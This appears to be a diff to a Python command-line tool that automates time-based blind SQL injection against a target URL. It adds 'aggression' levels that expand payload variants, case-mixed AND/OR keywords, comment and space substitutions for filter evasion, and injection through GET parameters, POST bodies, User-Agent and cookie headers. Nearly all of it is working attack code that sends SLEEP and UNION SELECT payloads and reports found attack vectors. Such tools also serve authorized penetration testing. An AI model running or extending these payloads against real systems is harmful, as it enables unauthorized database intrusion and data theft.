@@ -4,26 +4,37 @@ import sys
 from datetime import datetime
 import argparse
 from tabulate import tabulate
-import keyboard
 
-SQLI_TYPE = ['TIME', 'ERROR']
-TIME_BSD = 0
-ERROR_BSD = 1
+SQLI_TYPE       = ['TIME', 'ERROR']
+TIME_BSD        = 0
+ERROR_BSD       = 1
 
-METHODS = ['GET', 'POST']
-GET 	= 0
-POST 	= 1
+METHODS         = ['GET', 'POST']
+GET             = 0
+POST            = 1
 
-GETMETHODS = ['GETPARAM', 'GETSTRING', 'GETDIRECT']
-GET_PARAM = 0
-GET_STRING = 1
-GET_DIRECT = 2
-POSTMETHODS = ['POSTDATA', 'USERAGENT', 'COOKIEMOD']
-POST_DATA = 0
-USER_AGENT = 1
-COOKIE_MOD = 2
+GETMETHODS_0    = ['GETPARAM']
+GETMETHODS_1    = ['GETPARAM', 'GETSTRING']
+GETMETHODS_2    = ['GETPARAM', 'GETSTRING', 'GETDIRECT']
+GETMETHODS_3    = ['GETPARAM', 'GETSTRING', 'GETDIRECT']
+GETMETHODS      = ['GETPARAM', 'GETSTRING', 'GETDIRECT']
+GET_PARAM       = 0
+GET_STRING      = 1
+GET_DIRECT      = 2
+POSTMETHODS_0   = ['POSTDATA']
+POSTMETHODS_1   = ['POSTDATA', 'USERAGENT']
+POSTMETHODS_2   = ['POSTDATA', 'USERAGENT', 'COOKIEMOD']
+POSTMETHODS_3   = ['POSTDATA', 'USERAGENT', 'COOKIEMOD']
+POSTMETHODS     = ['POSTDATA', 'USERAGENT', 'COOKIEMOD']
+POST_DATA       = 0
+USER_AGENT      = 1
+COOKIE_MOD      = 2
 
-QUOTE_TYPES		= ['', "\'", '\"'] #, '\´', '\`']
+QUOTE_TYPES_0   = ['', "\'"]
+QUOTE_TYPES_1	= ['', "\'", '\"']
+QUOTE_TYPES_2	= ['', "\'", '\"', '\´']
+QUOTE_TYPES_3	= ['', "\'", '\"', '\´', '\`']
+QUOTE_TYPES     = ['', "\'", '\"', '\´', '\`']
 NO_QUOTE		= 0
 SINGLE_QUOTE	= 1
 DOUBLE_QUOTE	= 2
@@ -31,14 +42,33 @@ TICK        	= 3
 BACK_TICK   	= 4
 inQuote         = QUOTE_TYPES[NO_QUOTE]
 
-SQL_SUFFIXES	= ['', '-- -', '#', ' AND {}1{}={}1', " AND '1'='1", " AND 1=1"]
+SQL_SUFFIXES_0	= ['', '#', '-- -']
+SQL_SUFFIXES_1	= ['', '#', '-- -', ' AND 1=1']
+SQL_SUFFIXES_2	= ['', '#', '-- -', " AND '1'='1", ' AND 1=1', ' AND {}1{}={}1']
+SQL_SUFFIXES_3	= ['', '#', '-- -', " AND '1'='1", ' AND 1=1', ' AND {}1{}={}1']
+SQL_SUFFIXES	= ['', '#', '-- -', " AND '1'='1", ' AND 1=1', ' AND {}1{}={}1']
 SUFF_NO 		= 0
 SUFF_COMMENT	= 1
 SUFF_HASHTAG    = 2
-SUFF_AND_1      = 3
-SUFF_AND_1      = 4
+SUFF_AND_c1      = 3
+SUFF_AND_n1      = 4
 inSqlSuffix     = SQL_SUFFIXES[SUFF_NO]
 
+ESCAPE_AND_0    = ['AND']
+ESCAPE_AND_1    = ['AND', 'and', 'anD']
+ESCAPE_AND_2    = ['AND', 'and', 'And', 'anD']
+ESCAPE_AND_3    = ['AND', 'and', 'anD', 'And', 'ANd', 'aND', 'AnD', 'aNd']
+ESCAPE_AND      = ['AND', 'and', 'anD', 'And', 'ANd', 'aND', 'AnD', 'aNd']
+ESCAPE_OR_0     = ['OR']
+ESCAPE_OR_1     = ['OR', 'or']
+ESCAPE_OR_2     = ['OR', 'Or']
+ESCAPE_OR_3     = ['OR', 'or', 'oR', 'Or']
+ESCAPE_OR       = ['OR', 'or', 'oR', 'Or']
+
+SPACES_0        = [' ']
+SPACES_1        = [' ', '+', '/**/']
+SPACES_2        = [' ', '%20', '+', '/**/']
+SPACES_3        = [' ', '%20', '+', '/**/']
 SPACES          = [' ', '%20', '+', '/**/']
 SPACE_NORMAL    = 0
 SPACE_URLENC    = 1
@@ -66,7 +96,7 @@ logInfo = 0
 logDebug = 1
 logTrace = 2
 logAll = 3
-logLevels = ( 'Info', 'Debug', 'Trace', 'All')
+logLevels = [ 'Info', 'Debug', 'Trace', 'All' ]
 
 NrMin = 48
 NrMax = 57
@@ -90,12 +120,14 @@ defaultdb = ''
 tablename = ''
 pvUserAgentData = ''
 
-keyCmd = ''
-verbVar = logInfo #logAll
-dSec = 1
-defDBt = False
-sqliType = 0
-limitSize = 0
+verbVar         = logInfo #logAll
+dSec            = 1
+defDBt          = False
+sqliType        = 0
+limitSize       = 0
+aggression      = 0
+AGGR_LVL        = [ 'Normal (0)', 'Power (1)', 'Extreme (2)', 'Insane (3)' ]
+stopAfter       = 10
 
 method = METHODS[GET]
 subMethod = GETMETHODS[0]
@@ -125,8 +157,14 @@ payloadHead4 = "(select ascii(substr(" #"(select substring(@@version,1,1))='M'"
 payloadTail1 = "))))YNSg)"
 payloadTail4 = ")"
 
-mode1payloadPfx = ["", " ", " AND ", " OR ", " UNION SELECT", " OR 'x'='x' UNION SELECT"]
-mode1payloadSuf = ['', ',null', ',null,null', ',null,null,null', ',null,null,null,null', ',null,null,null,null,null'] #, ',null,null,null,null,null,null', ',null,null,null,null,null,null,null']
+mode1payloadPfx_0   = ["", " ", " AND ", " OR "]
+mode1payloadPfx_1   = ["", " ", " AND ", " OR ", " UNION SELECT"]
+mode1payloadPfx_2   = ["", " ", " AND ", " OR ", " UNION SELECT", " OR 'x'='x' UNION SELECT"]
+mode1payloadPfx_3   = ["", " ", " AND ", " OR ", " UNION SELECT", " OR 'x'='x' UNION SELECT"]
+mode1payloadPfx     = ["", " ", " AND ", " OR ", " UNION SELECT", " OR 'x'='x' UNION SELECT"]
+mode1payloadSuf_0   = ['']
+mode1payloadSuf_1   = ['', ',null', ',null,null', ',null,null,null', ',null,null,null,null', ',null,null,null,null,null']
+mode1payloadSuf     = ['', ',null', ',null,null', ',null,null,null', ',null,null,null,null', ',null,null,null,null,null'] #, ',null,null,null,null,null,null', ',null,null,null,null,null,null,null']
 
 payloadSchema = "SELECT count(*) FROM "+inFromTable+" WHERE table_schema="
 
@@ -276,14 +314,8 @@ def lenFind_sqliType(forWhat):
                 break
     return result
 
-def keyStroke(key):
-    global keyCmd
-    if key == 'Q':
-        keyCmd = 'QUIT'
-
 def testRun():
     global subMethod
-    global keyCmd
     global sutike
     global payload_str
     payload_str = ""
@@ -294,21 +326,75 @@ def testRun():
     payloadParams = []
     logki(logTrace,"[testRun]")
     result = False
-    USE_SUFFIXES = SQL_SUFFIXES
+    if aggression == 1:
+        USE_ESC_OR = ESCAPE_OR_1
+        USE_ESC_AND = ESCAPE_AND_1
+        USE_MPS = mode1payloadSuf_0
+        USE_SUFFIXES = SQL_SUFFIXES_1
+        USE_Q_TYP = QUOTE_TYPES_1
+        USE_MPP = mode1payloadPfx_1
+        USE_GE_ME = GETMETHODS_1
+        USE_PO_ME = POSTMETHODS_1
+        USE_SPACES = SPACES_1
+    elif aggression == 2:
+        USE_ESC_OR = ESCAPE_OR_2
+        USE_ESC_AND = ESCAPE_AND_2
+        USE_MPS = mode1payloadSuf_1
+        USE_SUFFIXES = SQL_SUFFIXES_2
+        USE_Q_TYP = QUOTE_TYPES_2
+        USE_MPP = mode1payloadPfx_2
+        USE_GE_ME = GETMETHODS_2
+        USE_PO_ME = POSTMETHODS_2
+        USE_SPACES = SPACES_2
+    elif aggression == 3:
+        USE_ESC_OR = ESCAPE_OR_3
+        USE_ESC_AND = ESCAPE_AND_3
+        USE_MPS = mode1payloadSuf_1
+        USE_SUFFIXES = SQL_SUFFIXES_3
+        USE_Q_TYP = QUOTE_TYPES_3
+        USE_MPP = mode1payloadPfx_3
+        USE_GE_ME = GETMETHODS_3
+        USE_PO_ME = POSTMETHODS_3
+        USE_SPACES = SPACES_3
+    else:
+        USE_ESC_OR = ESCAPE_OR_0
+        USE_ESC_AND = ESCAPE_AND_0
+        USE_MPS = mode1payloadSuf_0
+        USE_SUFFIXES = SQL_SUFFIXES_0
+        USE_Q_TYP = QUOTE_TYPES_0
+        USE_MPP = mode1payloadPfx_0
+        USE_GE_ME = GETMETHODS_0
+        USE_PO_ME = POSTMETHODS_0
+        USE_SPACES = SPACES_0
     findN = 0
     mszer = 1
     if method == 'GET':
-        mszer = len(GETMETHODS)
+        mszer = len(USE_GE_ME)
     if method == 'POST':
-        mszer = len(POSTMETHODS)
-    if verbVar >= logTrace:
-        print(QUOTE_TYPES)
-        print(SPACES)
+        mszer = len(USE_PO_ME)
+    if verbVar >= logDebug:
+        print('Use get sm   : ')
+        print(USE_GE_ME)
+        print('Use post sm  : ')
+        print(USE_PO_ME)
+        print('Esc OR       : ')
+        print(USE_ESC_OR)
+        print('Esc AND      : ')
+        print(USE_ESC_AND)
+        print('Esc spcaes   : ')
+        print(USE_SPACES)
+        print('Use quotes   : ')
+        print(USE_Q_TYP)
+        print('Use pl pfx   : ')
+        print(USE_MPP)
+        print('Use pl sfx   : ')
+        print(USE_MPS)
+        print('Use sql sfx  : ')
         print(USE_SUFFIXES)
         runparams()
     #keyboard.add_hotkey('q', lambda: keyStroke('Q'))
     #keyboard.add_hotkey('Q', lambda: keyStroke('Q'))
-    allTries = mszer * len(mode1payloadPfx) * len(mode1payloadSuf) * len(QUOTE_TYPES) * len(SPACES) * len(USE_SUFFIXES)
+    allTries = mszer * len(USE_MPP) * len(USE_MPS) * len(USE_Q_TYP) * len(SPACES) * len(USE_SUFFIXES) * len(USE_ESC_OR) * len(USE_ESC_AND)
     for gethdik in range(0, mszer):
         if result: break
         if method == 'GET':
@@ -316,106 +402,116 @@ def testRun():
         if method == 'POST':
             subMethod = POSTMETHODS[gethdik]
         #logki(logInfo,'[hdik] - ['+str(gethdik)+']')
-        for sufF in USE_SUFFIXES:
+        for escOR in USE_ESC_OR:
             if result: break
-            #logki(logInfo,'[mpS] - ['+str(mpS)+']')
-            for spcF in SPACES:
+            for escAND in USE_ESC_AND:
                 if result: break
-                #logki(logInfo,'[qt] - ['+str(qt)+']')
-                for qt in QUOTE_TYPES:
+                for sufF in USE_SUFFIXES:
                     if result: break
-                    #logki(logInfo,'[spcF] - ['+str(spcF)+']')
-                    for mpS in mode1payloadSuf:
+                    #logki(logInfo,'[mpS] - ['+str(mpS)+']')
+                    for spcF in SPACES:
                         if result: break
-                        #logki(logInfo,'[sufF] - ['+str(sufF)+']')
-                        for mpP in mode1payloadPfx:
-                            tries += 1
-                            payloadFinding = []
-                            if mpS == '':
-                                data = qt+mpP+"(SELECT 4978 FROM (SELECT(SLEEP("+str(dSec)+")))YNSg)"+sufF
-                            else:
-                                data = qt+mpP+" (SLEEP("+str(dSec)+"))"+mpS+sufF
-                            if method == 'GET':
-                                #logki(logAll,data)
-                                data = data.replace(' ', spcF)
-                                data = paramRight+data+restVar
-                                parameters = {paramLeft : data}
-                                #parameters = {'option' : 'com_fields', 'view' : 'fields', 'layout' : 'modal' , 'list[fullordering]' : data}
-                                payload_str = "&".join("%s=%s" % (k,v) for k,v in parameters.items())
-                                #logki(logAll,payload_str)
-                            if method == 'POST':
-                                if subMethod == POSTMETHODS[USER_AGENT]:
-                                    payload_str = useUserAgent+data
-                                    setHeader(sutike, payload_str)
-                                    data = preVar + restVar
-                                elif method == 'POST' and subMethod == POSTMETHODS[COOKIE_MOD]:
-                                    if sutike == '' or sutike[0] == ' ':
-                                        sutike = 'C' + sutike
-                                    payload_str = sutike+data
-                                    setHeader(payload_str, useUserAgent)
-                                    data = preVar + restVar
-                                else:
-                                    data = preVar+data
-                                    data = data.replace(' ', spcF)
-                                    data = data+restVar
-                                    payload_str = data
-                            logki(logAll,"data       : "+data)
-                            logki(logAll,"payload_str: "+payload_str)
-                            tstart = datetime.now()
-                            if method == 'GET':
-                                if gethdik == 0:
-                                    response = requests.get(pURL, params=parameters)
-                                elif gethdik == 1:
-                                    response = requests.get(pURL, params=payload_str)
-                                else:
-                                    parameters = {}
-                                    payload_str = data
-                                    dUrl = pURL + payload_str
-                                    logki(logAll,dUrl)
-                                    response = requests.get(dUrl, params=parameters)
-                            if method == 'POST':
-                                if subMethod == POSTMETHODS[USER_AGENT] or subMethod == POSTMETHODS[COOKIE_MOD]:
-                                    logki(logAll,pvUserAgentData)
-                                    response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=pvUserAgentData, verify=False)
-                                else:
-                                    response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
-                            logki(logTrace,response.url)
-                            tend = datetime.now()
-                            delta = tend - tstart
-                            tdelta = int(delta.total_seconds() * 1000 )
-                            logki(logAll,"Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
-                            sys.stdout.write("[ Round "+str(gethdik+1)+" / "+str(mszer)+" ["+subMethod+"] - Try #"+str(tries)+" / "+str(allTries)+" - Hit "+str(findN)+" ]\r") # - Press 'q' to stop
-                            sys.stdout.flush()
-                            if keyCmd == 'QUIT':
-                                result = True
-                            if (response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000):
-                                findN += 1
-                                payloadFinding.append(str(findN))
-                                payloadFinding.append(subMethod+" ("+str(gethdik)+")")
-                                payloadFinding.append('['+qt+mpP+']')
-                                #payloadFinding.append('['+mpP+']')
-                                payloadFinding.append('['+spcF+']')
-                                payloadFinding.append('['+mpS+']')
-                                payloadFinding.append('['+sufF+']')
-                                payloadFinding.append(payload_str)
-                                payloadParams.append(payloadFinding)
-                                logki(logTrace,'[hdik] - ['+str(gethdik+1)+']'+' '*40)
-                                logki(logTrace,'[qt]   - ['+qt+']')
-                                logki(logTrace,'[mpP]  - ['+mpP+']')
-                                logki(logTrace,'[spcF] - ['+spcF+']')
-                                logki(logTrace,'[mpS]  - ['+mpS+']')
-                                logki(logTrace,'[sufF] - ['+sufF+']')
-                                logki(logTrace,'--------------------------------')
-                                #if findN > 7: result = True
+                        #logki(logInfo,'[qt] - ['+str(qt)+']')
+                        for qt in USE_Q_TYP:
+                            if result: break
+                            #logki(logInfo,'[spcF] - ['+str(spcF)+']')
+                            for mpS in USE_MPS:
                                 if result: break
-                                #break
+                                #logki(logInfo,'[sufF] - ['+str(sufF)+']')
+                                for mpP in USE_MPP:
+                                    tries += 1
+                                    payloadFinding = []
+                                    mpPv = mpP.replace('OR', escOR)
+                                    mpPv = mpPv.replace('AND', escAND)
+                                    mpPv = mpPv.replace(' ', spcF)
+                                    sufFv = sufF.replace(' ', spcF)
+                                    if mpS == '':
+                                        data = qt+mpPv+"(SELECT 4978 FROM (SELECT(SLEEP("+str(dSec)+")))YNSg)"+sufFv
+                                    else:
+                                        data = qt+mpPv+" (SLEEP("+str(dSec)+"))"+mpS+sufFv
+                                    data = data.replace('OR', escOR)
+                                    data = data.replace('AND', escAND)
+                                    data = data.replace(' ', spcF)
+                                    if method == 'GET':
+                                        #logki(logAll,data)
+                                        data = paramRight+data+restVar
+                                        parameters = {paramLeft : data}
+                                        #parameters = {'option' : 'com_fields', 'view' : 'fields', 'layout' : 'modal' , 'list[fullordering]' : data}
+                                        payload_str = "&".join("%s=%s" % (k,v) for k,v in parameters.items())
+                                        #logki(logAll,payload_str)
+                                    if method == 'POST':
+                                        if subMethod == POSTMETHODS[USER_AGENT]:
+                                            payload_str = useUserAgent+data
+                                            setHeader(sutike, payload_str)
+                                            data = preVar + restVar
+                                        elif subMethod == POSTMETHODS[COOKIE_MOD]:
+                                            if sutike == '' or sutike[0] == ' ':
+                                                sutike = 'C' + sutike
+                                            payload_str = sutike+data
+                                            setHeader(payload_str, useUserAgent)
+                                            data = preVar + restVar
+                                        else:
+                                            data = preVar+data
+                                            data = data+restVar
+                                            payload_str = data
+                                    logki(logTrace,"data       : "+data)
+                                    logki(logTrace,"payload_str: "+payload_str)
+                                    tstart = datetime.now()
+                                    if method == 'GET':
+                                        if gethdik == 0:
+                                            response = requests.get(pURL, params=parameters)
+                                        elif gethdik == 1:
+                                            response = requests.get(pURL, params=payload_str)
+                                        else:
+                                            parameters = {}
+                                            payload_str = data
+                                            dUrl = pURL + payload_str
+                                            logki(logAll,dUrl)
+                                            response = requests.get(dUrl, params=parameters)
+                                    if method == 'POST':
+                                        if subMethod == POSTMETHODS[USER_AGENT] or subMethod == POSTMETHODS[COOKIE_MOD]:
+                                            logki(logAll,pvUserAgentData)
+                                            response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=pvUserAgentData, verify=False)
+                                        else:
+                                            response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
+                                    logki(logTrace,response.url)
+                                    tend = datetime.now()
+                                    delta = tend - tstart
+                                    tdelta = int(delta.total_seconds() * 1000 )
+                                    logki(logAll,"Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
+                                    sys.stdout.write("[ Round "+str(gethdik+1)+" / "+str(mszer)+" ["+subMethod+"] - Try #"+str(tries)+" / "+str(allTries)+" - Hit "+str(findN)+" ]\r") # - Press 'q' to stop
+                                    sys.stdout.flush()
+                                    if (response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000):
+                                        findN += 1
+                                        sys.stdout.write("[ Round "+str(gethdik+1)+" / "+str(mszer)+" ["+subMethod+"] - Try #"+str(tries)+" / "+str(allTries)+" - Hit "+str(findN)+" ]\r") # - Press 'q' to stop
+                                        sys.stdout.flush()
+                                        payloadFinding.append(str(findN))
+                                        payloadFinding.append(subMethod+" ("+str(gethdik)+")")
+                                        payloadFinding.append('['+qt+mpPv+']')
+                                        #payloadFinding.append('['+mpP+']')
+                                        payloadFinding.append('['+spcF+']')
+                                        payloadFinding.append('['+mpS+']')
+                                        payloadFinding.append('['+sufFv+']')
+                                        payloadFinding.append(payload_str)
+                                        payloadParams.append(payloadFinding)
+                                        logki(logTrace,'[hdik] - ['+str(gethdik+1)+']'+' '*40)
+                                        logki(logTrace,'[qt]   - ['+qt+']')
+                                        logki(logTrace,'[mpP]  - ['+mpPv+']')
+                                        logki(logTrace,'[spcF] - ['+spcF+']')
+                                        logki(logTrace,'[mpS]  - ['+mpS+']')
+                                        logki(logTrace,'[sufF] - ['+sufFv+']')
+                                        logki(logTrace,'--------------------------------')
+                                        if findN >= stopAfter: result = True
+                                        if result: break
+                                        #break
+    print("")
     print('---')
     print('Tries: '+str(tries)+' - url: '+pURL)
     if len(payloadParams):
         print('---')
         print('!Attack vector(s) found: '+str(findN)+'!')
         #print(payloadParams)
-        print(tabulate(payloadParams, headers=['#','suMethod','-ph(ead)','-sp(ace)','cNulls','-pt(ail)','payload'], tablefmt='orgtbl'))
+        print(tabulate(payloadParams, headers=['#','-sm(ethod)','-ph(ead)','-sp(ace)','cNulls','-pt(ail)','payload'], tablefmt='orgtbl'))
         print('---')
     else:
         print('+------------------+')
@@ -817,6 +913,9 @@ def runparams():
     print("Method        ["+method+"]")
     print("Submethod     ["+subMethod+"]")
     print("SQLi type     ["+SQLI_TYPE[sqliType]+"]")
+    if subMethod == 'tests...':
+        print("Aggression    ["+AGGR_LVL[aggression]+"]")
+        print("stopAfter     ["+str(stopAfter)+"]")
     #print("URL           ["+pURL+"]")
     logki(logDebug,"Cookie        ["+sutike+"]")
     logki(logDebug,"User-Agent    ["+useUserAgent+"]")
@@ -857,6 +956,8 @@ def main():
     parser.add_argument("-rt","--response_time",help="Delay time in second. (default 1, 1 -> 5 )",type=int)
     parser.add_argument("-rs","--response_size",help="Response limit size (kb)",type=int)
     parser.add_argument("-v","--verbose",default=0,help="Verbose level. INFO=0, DEBUG=1, TRACE=2, ALL=3",type=int)
+    parser.add_argument("-ag","--aggr_level",help="Input aggression level (default 0 - Normal, 1 - Power, 2 - Extreme, 3 - Insane).",type=int)
+    parser.add_argument("-stp","--stop_after",help="Stop after n findings (default 10, max. 100).",type=int)
 
     parser.add_argument("-ph","--paramshead",help="Paramter/Payloadstring before payload.",type=str)
     parser.add_argument("-sp","--space",help="Space replacement char(s).",type=str)
@@ -896,6 +997,8 @@ def main():
 
     global sqliType
     global limitSize
+    global aggression
+    global stopAfter
 
     global szoStart
 
@@ -937,6 +1040,20 @@ def main():
                 verbVar = 0
             if verbVar > 3:
                 verbVar = 3
+    if(args.aggr_level):
+            #logging.basicConfig(level=log_levels[args.verbosity])
+            aggression=args.aggr_level
+            if aggression < 0:
+                aggression = 0
+            if aggression > 3:
+                aggression = 3
+    if(args.stop_after):
+            #logging.basicConfig(level=log_levels[args.verbosity])
+            stopAfter=args.stop_after
+            if stopAfter <= 1:
+                stopAfter = 1
+            if stopAfter >= 100:
+                stopAfter = 100
     if not(args.url):
         print("Missing ULR!")
         canGo = False
